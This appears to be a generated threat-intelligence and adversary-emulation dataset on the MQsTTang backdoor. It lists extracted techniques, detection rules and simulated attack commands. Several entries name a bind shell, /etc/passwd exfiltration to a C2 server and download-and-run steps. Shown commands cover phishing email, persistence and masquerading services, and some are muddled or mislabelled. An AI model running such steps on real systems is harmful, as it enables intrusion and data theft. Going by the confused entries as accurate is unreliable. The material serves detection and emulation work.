extracted_ttps.description: The malware may be using a legitimate public broker to hide its infrastructure and make the network traffic seem legitimate
The attacker attributed to Mustang Panda, which has been known to use phishing in previous campaigns
MQsTTang communicates with its C&C server over the MQTT protocol using a public broker operated by EMQX
The attacker used GitHub repositories to host archives containing samples of MQsTTang, which could be executed by users
Mustang Panda APT group uses a custom backdoor called MQsTTang, which is part of an ongoing campaign
The malware uses various tools such as arp, at, net, ping, and psexec, which are commonly used for command and scripting interpreter techniques
Multiple legitimate and open-source tools, including psexec, ps, curl, and plink, were found on the staging server
The attacker used tools like arp, at, net, ping, and psexec, which could be used for file and directory discovery
The malware uses MQTT topics for communication, potentially for initial access
The output of executed commands is sent back to the server using the same protocol
The campaign is ongoing since early January 2023, which may involve phishing or other initial access techniques
Detected tools include arp, at, net, ping, and psexec, which are commonly used for command and scripting interpreter techniques
MQsTTang uses the QProcess class from the Qt framework to execute commands
MQsTTang detects running debuggers and alters its behavior if any are found to be present
MQsTTang checks the paths it is executed from to determine which tasks to execute
MQsTTang is distributed via spearphishing links to a malicious file on an attacker-controlled web server
MQsTTang communicates with its C&C server using the MQTT protocol
MQsTTang uses the MQTT protocol for C&C communication
Some servers used in the campaign seem to be exclusive to Mustang Panda
MQsTTang creates a registry key with the name 'qvlc', matching the name of a legitimate executable used by VLC
The malware executes commands received from the C&C server using QProcess::startCommand from the Qt framework
The malware detects analysis tools and changes its communication topics to avoid detection
MQsTTang relies on the user to execute the downloaded malicious file
The malware subscribes to its unique topic and publishes a KeepAlive message every 30 seconds
MQsTTang is a custom backdoor, probably developed by Mustang Panda
MQsTTang uses the FindWindowW Windows API to look for known analysis tools
Multiple tools were uploaded to an FTP server
MQsTTang uses the CreateToolhelp32Snapshot Windows API to iterate through running processes
The content of the messages between the malware and server is encrypted using a repeating XOR key
Detected Phishing activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
MQsTTang launches a copy of itself with a command line argument
MQsTTang backdoor executes arbitrary commands on a victim's machine
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
The content of the messages between the malware and server is base64 encoded
Detected Registry Run Keys activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

extracted_ttps.technique_name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
extracted_ttps.description: MQsTTang persists by creating a registry Run key
MQsTTang uses a legitimate public MQTT broker for bidirectional communication
Some servers used in the campaign are on shared hosting
MQsTTang is spread via spearphishing

extracted_ttps.description: MQsTTang uses filenames of legitimate programs when creating copies
MQsTTang was uploaded to the web server for distribution

rules.title: Phishing via EMQX and QMQTT Library

rules.title: MQTT-Based Command and Control Communication
rules.description: Detects potential MQTT-based command and control communication as used by MQsTTang malware
falsepositives: Legitimate MQTT-based applications or services
Misconfigured network devices or applications using port 1883

rules.title: User Execution via GitHub-hosted Archive (YanNaingOo0072022)
rules.description: Detects processes that execute or download content from GitHub repositories containing the identifier YanNaingOo0072022, indicating possible user execution of malicious archives.
falsepositives: Developers using Git or PowerShell to clone or download legitimate repositories from GitHub.
Automated build or CI scripts that pull code from GitHub containing the string YanNaingOo0072022 as part of a version tag or comment.
Security tools or scripts that scan GitHub repositories and include the identifier in their command lines.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Execution of Native Networking Utilities (arp, at, net, ping, psexec)
rules.description: Detects execution of common networking and remote execution utilities that are often abused for command and scripting interpreter techniques (T1059).

detection.condition: selection_arp or selection_at or selection_net or selection_ping or selection_psexec

falsepositives: Legitimate administrative use of arp, at, net, ping, or psexec for network troubleshooting, scheduled task creation, or remote management.
Security tools or scripts that invoke these utilities as part of normal operations.

rules.title: Detect Spearphishing RAR Attachment Extraction via Office and WinRAR
rules.description: Detects execution patterns associated with spearphishing emails delivering RAR archives, where WINWORD.EXE opens a .rar file or spawns extraction tools (WinRAR, cmd, PowerShell). This aligns with ATT&CK technique T1190 (Exploit Public-Facing Application) and T1566.001 (Spearphishing Attachment).

detection.condition: selection1 or selection2 or selection3 or selection4

falsepositives: Legitimate users opening RAR attachments from trusted senders in Microsoft Word.
IT administrators extracting archives using WinRAR or command line tools.
Automated scripts that process RAR files via PowerShell or cmd.

attacks.description: Downloads a benign file using certutil
attacks.expected_behavior: The benign file will be downloaded to the temp directory

attacks.description: Executes the downloaded benign file using PowerShell
attacks.expected_behavior: The benign file will be executed

attacks.description: Simulates network traffic by adding a new user
attacks.expected_behavior: A new user will be added to the system

attacks.command: echo 'Please enter your credentials: ' > phishing.txt; cat phishing.txt
attacks.description: Basic phishing simulation using a text file
attacks.expected_behavior: Prompts the user to enter credentials, demonstrating a basic phishing attempt

attacks.description: Intermediate phishing simulation using a fake webpage
attacks.expected_behavior: Opens a fake phishing webpage, simulating a more sophisticated phishing attempt

attacks.command: python3 -c 'import smtplib; server = smtplib.SMTP("smtp.example.com", 587); server.starttls(); server.login("phisher@example.com", "password"); server.sendmail("phisher@example.com", "victim@example.com", "Subject: Phishing Email\n\nPlease click this link: https://example.com/phishing-link"); server.quit()'
attacks.description: Advanced phishing simulation using a Python script to send a fake email
attacks.expected_behavior: Sends a fake phishing email, demonstrating a more complex phishing attempt

attacks.description: Basic command to simulate MQTT communication by sending a POST request to an MQTT test broker.
attacks.expected_behavior: The command sends a POST request to the specified MQTT test broker with a simple 'Hello, MQTT!' message.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Net.Http; $httpClient = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.StringContent('Hello, MQTT!', [System.Text.Encoding]::UTF8, 'text/plain'); $response = $httpClient.PostAsync('http://test.mosquitto.org:8080/', $content).Result"
attacks.description: Intermediate command using .NET's HttpClient to post a message to an MQTT broker, simulating more complex communication.
attacks.expected_behavior: This command uses the HttpClient .NET class to send a POST request with a 'Hello, MQTT!' message to the MQTT test broker, demonstrating a more complex interaction.

attacks.description: Advanced command that manually constructs an HTTP POST request to simulate MQTT communication, including setting the content type and writing the message to the request stream.
attacks.expected_behavior: This advanced command manually creates an HTTP POST request, sets the content type to 'text/plain', and writes the 'Advanced MQTT Test' message to the request stream before sending it to the MQTT broker and getting the response.

attacks.description: Basic example of publishing a message to an MQTT topic using a public broker.
attacks.expected_behavior: The message 'Hello, World!' is published to the 'test/topic' topic on the test.mosquitto.org MQTT broker.

attacks.description: Intermediate example of subscribing to an MQTT topic and verbose output.
attacks.expected_behavior: The subscriber receives and prints all messages published to the 'test/topic' topic on the test.mosquitto.org MQTT broker with verbose output.

attacks.description: Advanced example of publishing a message from stdin to an MQTT topic.
attacks.expected_behavior: The message 'Hello, World!' is read from stdin and published to the 'test/topic' topic on the test.mosquitto.org MQTT broker.

attacks.description: Basic: User executes a malicious file from a website using Internet Explorer
attacks.expected_behavior: Internet Explorer will open and navigate to the specified website, potentially executing the malicious file

attacks.description: Intermediate: User executes a malicious PowerShell script from the Public directory
attacks.expected_behavior: PowerShell will execute the script, potentially causing malicious activity

attacks.description: Advanced: User executes a malicious file from a website using certutil and then runs it from the Temp directory
attacks.expected_behavior: certutil will download the malicious file to the Temp directory and then execute it, potentially causing malicious activity

attacks.description: Basic example of user execution using wget and bash
attacks.expected_behavior: The command downloads a script and executes it using bash

attacks.description: Intermediate example of user execution using curl and bash
attacks.expected_behavior: The command downloads a script and executes it using bash without saving to disk

attacks.description: Advanced example of user execution using git and bash
attacks.expected_behavior: The command clones a repository, navigates to the directory, and executes a script using bash

attacks.description: Adds a new user to the system using the net.exe command
attacks.expected_behavior: A new user is added to the system with the specified username and password

attacks.description: Creates a new file in the temp directory using cmd.exe
attacks.expected_behavior: A new file named test.txt is created in the temp directory with the contents 'Hello World'

attacks.description: Uses powershell.exe to get a list of running processes and saves it to a file
attacks.expected_behavior: A new file named processes.txt is created in the temp directory with a list of running processes

attacks.description: Basic command execution using bash to create a test file
attacks.expected_behavior: Creates a file named test_file.txt in /tmp with the content TEST_STRING

attacks.description: Intermediate command using ping to test network connectivity, suppressing output
attacks.expected_behavior: Sends a single ping to 8.8.8.8 and discards the output

attacks.description: Advanced command setting up a netcat listener that executes bash upon connection
attacks.expected_behavior: Listens on port 12345 and executes /bin/bash when a connection is established

attacks.description: Downloads a tool from a specified URL to the temp directory using certutil.
attacks.expected_behavior: Downloads the specified tool to the temp directory without executing it.

attacks.description: Downloads a PowerShell script from a specified URL to the temp directory.
attacks.expected_behavior: Downloads the specified PowerShell script to the temp directory without executing it.

attacks.description: Downloads a tool from a specified URL to the temp directory using curl (if available).
attacks.expected_behavior: Downloads the specified tool to the temp directory without executing it, assuming curl is installed and available.

attacks.description: Download and extract a tool using curl and tar
attacks.expected_behavior: Downloads a tarball from a specified URL and extracts it locally

attacks.description: Download and unzip a tool using wget and unzip
attacks.expected_behavior: Downloads a zip file from a specified URL and unzips it locally

attacks.command: git clone https://github.com/example/tool.git; cd tool; ./configure; make; make install
attacks.description: Clone, build, and install a tool from a Git repository
attacks.expected_behavior: Clones a Git repository, builds the tool, and installs it, potentially requiring admin privileges for installation

attacks.description: List files and directories in the System32 folder
attacks.expected_behavior: Lists files and directories without recursive listing

attacks.description: Use PowerShell to list files and directories on the Public Desktop
attacks.expected_behavior: Lists files and directories on the Public Desktop without recursive listing

attacks.description: List shared directories on the local machine
attacks.expected_behavior: Lists shared directories, may require admin privileges

attacks.description: List files and directories in the current directory
attacks.expected_behavior: Lists files and directories in the current directory

attacks.description: Search for a file named test.txt in the /home directory
attacks.expected_behavior: Searches for a file named test.txt in the /home directory and prints the path if found

attacks.description: List files and directories in the /home/user directory
attacks.expected_behavior: Lists files and directories in the /home/user directory

attacks.description: Basic example of creating a file in the temp directory and then exfiltrating its content by typing it out, simulating data being sent back over a C2 channel.
attacks.expected_behavior: Creates a file named exfil_data.txt in the temp directory, writes 'TestExfiltrationData' to it, and then outputs the file's content to the console, simulating exfiltration.

attacks.description: Intermediate example using PowerShell to create a file, write to it, and then read from it, simulating the exfiltration of data over a C2 channel with encoding consideration.
attacks.expected_behavior: Creates a file named exfil_data.txt in the temp directory, writes 'TestExfiltrationData' to it with UTF8 encoding, and then reads and outputs the file's content, demonstrating controlled exfiltration.

attacks.description: Advanced example that involves creating a file, encoding its content using certutil, and then exfiltrating the encoded data, simulating a more complex C2 channel communication.
attacks.expected_behavior: Creates a file named exfil_c2_data.txt, writes 'TestExfiltrationDataOverC2' to it, encodes the file using certutil, and then outputs the encoded file's content, demonstrating exfiltration over a simulated C2 channel with data encoding.

attacks.description: Basic exfiltration using netcat to send a test string to a hypothetical C2 server.
attacks.expected_behavior: The command sends the string 'Test exfiltration data' to the specified server and port, simulating data exfiltration over a C2 channel.

attacks.description: Intermediate exfiltration attempt by sending the contents of /etc/passwd to a C2 server.
attacks.expected_behavior: This command reads the /etc/passwd file and sends its contents to the specified server and port, demonstrating a more targeted exfiltration attempt.

attacks.description: Advanced exfiltration by archiving /etc/passwd and sending it to a C2 server.
attacks.expected_behavior: The command creates a tar archive of /etc/passwd on the fly and pipes it to netcat, which sends the archive to the specified server and port, showing a more complex exfiltration method.

attacks.description: Add a new user using the net.exe binary
attacks.expected_behavior: A new user will be added to the system

attacks.description: Execute a command using PowerShell and the Start-Process cmdlet
attacks.expected_behavior: The command will be executed and 'Hello World!' will be printed to the console

attacks.description: Create a new directory and file using the cmd.exe binary
attacks.expected_behavior: A new directory and file will be created in the temp directory

attacks.description: Basic command execution using qprocess
attacks.expected_behavior: Prints 'Hello World' to the console

attacks.description: Intermediate command execution using qprocess to list directory contents
attacks.expected_behavior: Lists the current directory's contents in a detailed format

attacks.command: qprocess mkdir testdir && qprocess ls -l testdir
attacks.description: Advanced command execution using qprocess to create a directory and list its contents
attacks.expected_behavior: Creates a new directory named 'testdir' and lists its contents

attacks.description: List running processes and search for debuggers
attacks.expected_behavior: The command will display a list of running processes and highlight any debuggers found.

attacks.description: Use PowerShell to get processes with a main window title containing 'debug'
attacks.expected_behavior: The command will display a list of processes with a main window title containing 'debug'.

attacks.description: Use the debugger to attach to notepad.exe and immediately quit
attacks.expected_behavior: The command will attach to notepad.exe using the debugger and then quit.

attacks.command: if [ -z "$BASH_ARGV0" ]; then echo "No debugger detected"; else echo "Debugger detected"; fi
attacks.description: Basic command to check if a debugger is attached by verifying the presence of BASH_ARGV0, which is typically set when a script is run under a debugger.
attacks.expected_behavior: The command checks for the BASH_ARGV0 variable and prints whether a debugger is detected or not.

attacks.command: if [ -n "$DEBUGGER" ]; then echo "Debugger detected, exiting"; exit 1; fi; /bin/sleep 10
attacks.description: Intermediate command that checks for a specific environment variable ($DEBUGGER) indicating a debugger's presence and exits if found, otherwise executes a benign command (/bin/sleep 10).
attacks.expected_behavior: The command checks for the DEBUGGER variable and exits if it's set; otherwise, it executes a sleep command.

attacks.command: if pgrep -f gdb > /dev/null; then echo "Debugger detected, altering behavior"; /bin/echo "Evading..."; else /bin/echo "No debugger, proceeding"; fi
attacks.description: Advanced command using pgrep to search for a running gdb process, indicating a debugger, and alters its behavior by printing a message if a debugger is detected.
attacks.expected_behavior: The command uses pgrep to check for a running gdb process and prints different messages based on whether a debugger is detected.

attacks.command: powershell -Command "if ((Split-Path -Path $MyInvocation.MyCommand.Path) -eq 'C:\\Path\\To\\Allowed\\Directory') { echo 'Allowed execution path'; } else { echo 'Not allowed execution path'; }"
attacks.description: Basic script that checks execution path and prints a message based on whether it's allowed or not
attacks.expected_behavior: Prints 'Allowed execution path' if executed from the specified directory, otherwise prints 'Not allowed execution path'

attacks.command: powershell -Command "if ((Split-Path -Path $MyInvocation.MyCommand.Path) -like 'C:\\Path\\To\\Allowed\\Directory\\*') { echo 'Allowed execution path'; } else { echo 'Not allowed execution path'; }"
attacks.description: Intermediate script that checks execution path using a wildcard and prints a message based on whether it's allowed or not
attacks.expected_behavior: Prints 'Allowed execution path' if executed from any subdirectory of the specified directory, otherwise prints 'Not allowed execution path'

attacks.command: powershell -Command "if ((Split-Path -Path $MyInvocation.MyCommand.Path) -eq 'C:\\Path\\To\\Allowed\\Directory') { mkdir 'C:\\Path\\To\\Allowed\\Directory\\Test' -ErrorAction SilentlyContinue; } else { echo 'Not allowed execution path'; }"
attacks.description: Advanced script that checks execution path and creates a directory if allowed, otherwise prints a message
attacks.expected_behavior: Creates a directory 'Test' in the specified directory if executed from the same directory, otherwise prints 'Not allowed execution path'

attacks.command: bash -c 'if [ "$(pwd)" == "/home/user/" ]; then echo "Executing from home directory"; else echo "Executing from another directory"; fi'
attacks.description: Basic command that checks the execution path and prints a message
attacks.expected_behavior: Prints a message indicating the execution path

attacks.command: bash -c 'if [ "$(pwd)" == "/home/user/" ]; then touch executed_from_home; else touch executed_from_another_directory; fi'
attacks.description: Intermediate command that creates a file based on the execution path
attacks.expected_behavior: Creates a file indicating the execution path

attacks.command: bash -c 'if [ "${PATH##*/}" == "home" ]; then echo "Executing from home directory"; else echo "Executing from another directory"; fi'
attacks.description: Advanced command that uses environment variables to determine the execution path
attacks.expected_behavior: Prints a message indicating the execution path based on the PATH environment variable

attacks.expected_behavior: The command downloads a test file from the specified web server and saves it to the temporary directory.

attacks.expected_behavior: The command downloads a test file from the specified web server and saves it to the temporary directory.

attacks.description: Downloads a file from a specified URL to the user's Downloads folder using wget.
attacks.expected_behavior: The command downloads a file quietly from the specified URL to the user's Downloads folder without requiring admin privileges.

attacks.description: Downloads and executes a script from a specified URL using curl and bash.
attacks.expected_behavior: The command downloads a script from the specified URL and executes it using bash, potentially leading to malicious activity without requiring admin privileges.

attacks.description: Basic command to test PowerShell execution with a benign MQTT-related string.
attacks.expected_behavior: Executes a PowerShell command that prints a test string, simulating MQTT communication without actually establishing an encrypted channel.

attacks.description: Intermediate command using cmd.exe to create a file in the temp directory with MQTT-related content.
attacks.expected_behavior: Creates a text file in the temporary directory with a benign string, simulating data that could be sent over an encrypted channel.

attacks.description: Advanced command attempting to establish an SSL/TLS connection to an MQTT server, simulating encrypted communication.
attacks.expected_behavior: Tries to connect to an MQTT server over SSL/TLS, demonstrating the establishment of an encrypted channel for C&C communication.

attacks.description: Basic command to publish a message to an MQTT topic
attacks.expected_behavior: The command will publish the message 'Hello, World!' to the 'test/topic' topic on the local MQTT broker.

attacks.description: Intermediate command to subscribe to an MQTT topic
attacks.expected_behavior: The command will subscribe to the 'test/topic' topic on the local MQTT broker and print any received messages to the console.

attacks.description: Advanced command to publish a message to an MQTT topic with authentication
attacks.expected_behavior: The command will publish the message 'Hello, World!' to the 'test/topic' topic on the local MQTT broker, using the provided username and password for authentication.

attacks.command: sc create MUSTANGPandaServer binPath= "cmd.exe /c \"echo Server placeholder > %TEMP%\\server.txt\"" start= auto
attacks.description: Creates a Windows service named 'MUSTANGPandaServer' that runs a harmless command writing a placeholder file, demonstrating provisioning of a server component.
attacks.expected_behavior: A new service appears in the Service Control Manager list; when started, it creates %TEMP%\server.txt containing the text 'Server placeholder'.

attacks.command: netsh advfirewall firewall add rule name="MUSTANGPandaServerPort" dir=in action=allow protocol=TCP localport=8080
attacks.description: Adds a firewall rule to allow inbound TCP traffic on port 8080, preparing the host to accept connections to the newly provisioned server.
attacks.expected_behavior: The Windows Firewall now permits inbound connections on port 8080; netsh reports the rule was added successfully.

attacks.description: Starts a simple HTTP listener on port 8080 that responds with 'OK' to any request, representing an operational server ready for C2 traffic.
attacks.expected_behavior: PowerShell runs a background loop listening on port 8080; connecting via a browser or curl to http://<host>:8080 returns the string 'OK'.

attacks.command: nc -l -p 8080 -c 'echo Hello, this is a test server!'
attacks.description: Basic server setup using netcat to listen on port 8080 and respond with a test message.
attacks.expected_behavior: The command sets up a simple server that listens on port 8080 and responds with 'Hello, this is a test server!' when a connection is made.

attacks.description: Intermediate server setup using Python's built-in http.server module to serve files from the current directory on port 8080.
attacks.expected_behavior: The command sets up a simple HTTP server that serves files from the current directory on port 8080.

attacks.description: Advanced scenario setting up an SSH tunnel to forward traffic from local port 8080 to port 80 on a remote server.
attacks.expected_behavior: The command sets up an SSH tunnel that forwards traffic from local port 8080 to port 80 on the remote server, allowing for secure access to the remote server's HTTP service.

attacks.description: Creates a Run registry entry named 'qvlc' that launches notepad.exe at user logon, masquerading as a VLC executable.
attacks.expected_behavior: A new value 'qvlc' appears under HKCU\...\Run pointing to notepad.exe; no immediate visible effect, but the entry would cause notepad to start on login.

attacks.description: Registers a scheduled task named 'qvlc' that runs notepad.exe, mimicking a VLC task.
attacks.expected_behavior: A task called 'qvlc' appears in the Task Scheduler list; when triggered (immediately due to past time), it launches notepad.exe.

attacks.command: sc create qvlc binPath= "C:\\Windows\\System32\\notepad.exe" DisplayName= "VLC Media Player" start= auto
attacks.description: Creates a Windows service named 'qvlc' with a display name of 'VLC Media Player' that runs notepad.exe, demonstrating service masquerading.
attacks.expected_behavior: A new service 'qvlc' is installed; its status can be queried with 'sc query qvlc' and it can be started, which will launch notepad.exe.

attacks.description: Start a new service named qvlc, mimicking a legitimate service
attacks.expected_behavior: A new service named qvlc will be started, potentially masquerading as a legitimate VLC-related service

attacks.description: Start a new service named qvlc using an init script, masquerading as a legitimate service
attacks.expected_behavior: A new service named qvlc will be started, potentially masquerading as a legitimate VLC-related service

attacks.description: Enable and start a new service named qvlc, ensuring it starts at boot, masquerading as a legitimate service
attacks.expected_behavior: A new service named qvlc will be enabled to start at boot and started immediately, potentially masquerading as a legitimate VLC-related service

attacks.description: Basic command to execute a malicious file from the user's temporary directory using cmd.exe.
attacks.expected_behavior: The malicious file will be executed by the user, demonstrating the technique without requiring admin privileges.

attacks.description: Intermediate command using PowerShell to start a malicious file, ensuring proper quoting and safety.
attacks.expected_behavior: The malicious file will be executed through PowerShell, showing the technique's applicability with PowerShell commands.

attacks.description: Advanced command using certutil to download a file and then execute it, simulating a more complex attack scenario while adhering to safety guidelines.
attacks.expected_behavior: This command demonstrates a more sophisticated attack by downloading and then executing a malicious file, all within the user's context and without admin privileges, highlighting the technique's potential impact.

attacks.command: echo 'echo Hello World!' > malicious_file.sh; chmod +x malicious_file.sh; ./malicious_file.sh
attacks.description: Basic example of creating a file, making it executable, and running it.
attacks.expected_behavior: The command creates a file named 'malicious_file.sh', adds execute permissions, and then runs it, printing 'Hello World!' to the terminal.

attacks.description: Intermediate example assuming internet access to download a file, make it executable, and execute it.
attacks.expected_behavior: Downloads a file from a specified URL, makes it executable, and attempts to run it. Note: This command assumes internet access and the file being downloaded is benign.

attacks.description: Advanced example copying a system binary to a new location, making it executable (if needed), and executing it.
attacks.expected_behavior: Copies the 'echo' binary to '/tmp/malicious_file', ensures it's executable, and then runs it. This demonstrates executing a file in a different context.

attacks.description: Add a new registry key to the Run folder using reg.exe
attacks.expected_behavior: A new registry key will be added to the Run folder

attacks.description: Add a new registry key to the Run folder using reg.exe with a PowerShell command
attacks.expected_behavior: A new registry key will be added to the Run folder and will execute a PowerShell command when run

attacks.description: Delete a registry key from the Run folder using reg.exe
attacks.expected_behavior: The registry key will be deleted from the Run folder

attacks.description: Modify a test configuration file to demonstrate registry modification technique.
attacks.expected_behavior: A new file /etc/test_config will be created with the content 'test_string', demonstrating the ability to modify system configuration.

attacks.description: Append a test string to the environment file to simulate persistence.
attacks.expected_behavior: The string 'test_string' will be appended to /etc/environment, showing how an attacker might modify system settings for persistence.

attacks.description: Use sed to replace a string in a configuration file, demonstrating modification of system settings.
attacks.expected_behavior: Any occurrence of 'old_string' in /etc/test_config will be replaced with 'test_string', illustrating the modification of registry-like settings on Linux.

attacks.description: Downloads a benign executable from a test URL and executes it, simulating the download and execution of custom malware.
attacks.expected_behavior: The command downloads a file and executes it. In a real scenario, this could be a malicious backdoor, but for testing, it's a benign executable.

attacks.description: Creates a temporary file, reads it, and then deletes it, simulating basic file operations that malware might perform.
attacks.expected_behavior: The command creates, reads, and deletes a temporary file without any malicious intent, demonstrating basic file manipulation capabilities.

attacks.description: Creates a directory, writes a file into it, and lists the directory contents, simulating more complex malware behaviors like creating persistence mechanisms.
attacks.expected_behavior: The command creates a directory, adds a file to it, and then lists the directory's contents, demonstrating how malware might create and manage its own files and directories.

attacks.description: Basic simulation of creating a malware development file
attacks.expected_behavior: Creates a text file named malware_dev.txt in the user's home directory with the specified content.

attacks.description: Intermediate simulation of creating a malware development directory and file
attacks.expected_behavior: Creates a directory named malware_dev in the user's home directory and a text file named malware_dev.txt inside it with the specified content.

attacks.description: Advanced simulation of creating a malware development directory and file in a system directory
attacks.expected_behavior: Creates a directory named malware_dev in the /opt directory and a text file named malware_dev.txt inside it with the specified content. Requires admin privileges.

attacks.description: Connect to an FTP server
attacks.expected_behavior: Establishes a connection to the specified FTP server

attacks.command: powershell -Command "echo open ftp.example.com > ftpscript.txt; echo user username password >> ftpscript.txt; echo put %TEMP%\testfile.txt >> ftpscript.txt; echo quit >> ftpscript.txt; ftp -s:ftpscript.txt"
attacks.description: Upload a file to an FTP server using a script
attacks.expected_behavior: Uploads a file named testfile.txt from the temporary directory to the FTP server

attacks.description: Execute an FTP script to upload multiple files
attacks.expected_behavior: Executes the commands in the script file, which can include uploading multiple files to the FTP server

attacks.command:
ftp -inv ftp.example.com << EOF
user test test
put /tmp/test.txt
EOF
attacks.description: Upload a file to an FTP server using the ftp command
attacks.expected_behavior: The command uploads a file named test.txt from /tmp to the FTP server ftp.example.com

attacks.description: Upload a file to an FTP server using curl
attacks.expected_behavior: The command uploads a file named test.txt from /tmp to the incoming directory on the FTP server ftp.example.com

attacks.command:
lftp -u test,test ftp.example.com << EOF
put /tmp/test.txt
EOF
attacks.description: Upload a file to an FTP server using lftp
attacks.expected_behavior: The command uploads a file named test.txt from /tmp to the FTP server ftp.example.com

attacks.description: List all running processes using tasklist
attacks.expected_behavior: A list of running processes will be displayed in the command prompt

attacks.description: Query the list of running processes using wmic
attacks.expected_behavior: A list of running processes will be displayed in the command prompt

attacks.description: Get a list of running processes using PowerShell
attacks.expected_behavior: A list of running processes will be displayed in the PowerShell console

attacks.description: Lists all running processes on the system, including their ownership and resource usage, demonstrating basic system information discovery.
attacks.expected_behavior: Displays a list of running processes.

attacks.description: Displays detailed information about the system, including the kernel version, hostname, and operating system, demonstrating intermediate system information discovery.
attacks.expected_behavior: Displays system information.

attacks.description: Displays detailed information about the system's CPU, demonstrating advanced system information discovery.
attacks.expected_behavior: Displays CPU information.

attacks.description: Encrypt a file using AES-256-CBC symmetric encryption
attacks.expected_behavior: The file will be encrypted using the provided symmetric key

attacks.description: Decrypt a file using AES-256-CBC symmetric encryption
attacks.expected_behavior: The file will be decrypted using the provided symmetric key

attacks.description: Encrypt a message using AES-256-CBC symmetric encryption and convert it to a hexadecimal string
attacks.expected_behavior: The message will be encrypted using the provided symmetric key and converted to a hexadecimal string

attacks.description: Launch a new instance of notepad.exe using cmd.exe
attacks.expected_behavior: A new instance of notepad.exe will be launched

attacks.description: Launch a new instance of cmd.exe with an argument using powershell.exe
attacks.expected_behavior: A new instance of cmd.exe will be launched with the argument '/c echo Hello World!'

attacks.description: Launch a new instance of powershell.exe with a script block using cmd.exe
attacks.expected_behavior: A new instance of powershell.exe will be launched with a script block that echoes 'Hello World!' and waits for 10 seconds

attacks.description: Launch a sleep process using systemd-run
attacks.expected_behavior: A sleep process will be launched and run for 100 seconds

attacks.description: Launch a sleep process using nohup
attacks.expected_behavior: A sleep process will be launched and run for 100 seconds, even after the terminal is closed

attacks.description: Launch a sleep process using systemd-run with a nice value of 10
attacks.expected_behavior: A sleep process will be launched with a nice value of 10, which means it will run with lower priority

attacks.description: Encode a string using base64
attacks.expected_behavior: The command will output the base64 encoded string

attacks.description: Decode a base64 encoded string
attacks.expected_behavior: The command will output the decoded string

attacks.description: Use certutil to encode a file using base64
attacks.expected_behavior: The command will create a new file with the base64 encoded contents of the original file

attacks.description: Basic example of encoding a string using base64
attacks.expected_behavior: The string 'Hello, World!' will be encoded in base64 and printed to the console.

attacks.description: Intermediate example of decoding a base64 encoded string
attacks.expected_behavior: The base64 encoded string 'SGVsbG8sIFdvcmxkIQ==' will be decoded and printed to the console, resulting in 'Hello, World!'.

attacks.command: echo 'This is a secret message.' | base64 > encoded_message.txt; base64 -d encoded_message.txt
attacks.description: Advanced example of encoding a string, saving it to a file, and then decoding it
attacks.expected_behavior: The string 'This is a secret message.' will be encoded in base64, saved to a file named 'encoded_message.txt', and then decoded from the file and printed to the console.

attacks.description: Creates a per‑user Run registry entry that points to a benign executable in the temporary folder, establishing persistence for the current user.
attacks.expected_behavior: A new value named 'TestApp' is added under HKCU\...\Run. On the next logon of the current user, Windows will attempt to launch %TEMP%\testapp.exe.

attacks.description: Creates a system‑wide Run registry entry that launches Notepad for every user that logs on, demonstrating persistence that requires administrative rights.
attacks.expected_behavior: A new value named 'TestAppSys' is added under HKLM\...\Run. At each user logon, Windows will start notepad.exe, confirming the persistence entry.

attacks.description: Adds a RunOnce entry for the current user that points to a temporary batch file, causing the command to execute only once at the next logon and then automatically removing the entry.
attacks.expected_behavior: A new value named 'TempScript' is created under HKCU\...\RunOnce. When the user logs on next time, Windows runs %TEMP%\temp.bat and then deletes the RunOnce entry.

attacks.description: Basic persistence test by creating a desktop entry in the user's autostart directory to execute a script on startup.
attacks.expected_behavior: A file named 'persistence_test.txt' with the content 'Test Persistence' will be created in /tmp upon each login.

attacks.description: Intermediate persistence test requiring root privileges, appending a command to /etc/rc.local to execute on system startup.
attacks.expected_behavior: A file named 'root_persistence_test.txt' with the content 'Root Test Persistence' will be created in /tmp on the next system boot.

attacks.command: crontab -l | { cat; echo "@reboot echo 'Cron Test Persistence' > /tmp/cron_persistence_test.txt"; } | crontab -
attacks.description: Advanced persistence test using crontab to schedule a command execution at system reboot.
attacks.expected_behavior: A file named 'cron_persistence_test.txt' with the content 'Cron Test Persistence' will be created in /tmp on the next system boot.

attacks.command: powershell -Command "& {Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $client.PostAsync('http://localhost:8080/mqtt', [System.Net.Http.StringContent]'Hello, World!') | Out-Null}"
attacks.description: Publish a message to an MQTT topic using a local MQTT broker
attacks.expected_behavior: The command will publish a message to an MQTT topic and the message will be received by any subscriber to the topic.

attacks.command: powershell -Command "& {Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $response = $client.GetAsync('http://localhost:8080/mqtt') | Wait-Command; $response.Content.ReadAsStringAsync() | Out-Host}"
attacks.description: Subscribe to an MQTT topic and receive messages using a local MQTT broker
attacks.expected_behavior: The command will subscribe to an MQTT topic and receive any messages published to the topic.

attacks.command: cmd.exe /c "echo Hello, World! > %TEMP%\message.txt && certutil -f -encode %TEMP%\message.txt %TEMP%\encoded_message.txt && powershell -Command "& {Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $client.PostAsync('http://localhost:8080/mqtt', [System.Net.Http.StringContent][System.IO.File]::ReadAllText('%TEMP%\encoded_message.txt')) | Out-Null}""
attacks.description: Publish an encoded message to an MQTT topic using a local MQTT broker
attacks.expected_behavior: The command will publish an encoded message to an MQTT topic and the message will be received by any subscriber to the topic.

attacks.description: Basic example of publishing a message to an MQTT topic using a public broker.
attacks.expected_behavior: The command publishes the message 'Hello, World!' to the 'test/topic' topic on the test.mosquitto.org MQTT broker, demonstrating basic MQTT publication.

attacks.description: Intermediate example of subscribing to an MQTT topic and verbose output.
attacks.expected_behavior: The command subscribes to the 'test/topic' topic on the test.mosquitto.org MQTT broker and prints any received messages in verbose mode, demonstrating subscription and reception.

attacks.command: while true; do mosquitto_pub -h test.mosquitto.org -t 'test/topic' -m "$(date)"; sleep 5; done
attacks.description: Advanced example of continuously publishing the current date to an MQTT topic at 5-second intervals.
attacks.expected_behavior: The command continuously publishes the current date to the 'test/topic' topic on the test.mosquitto.org MQTT broker every 5 seconds, demonstrating persistent bidirectional communication.

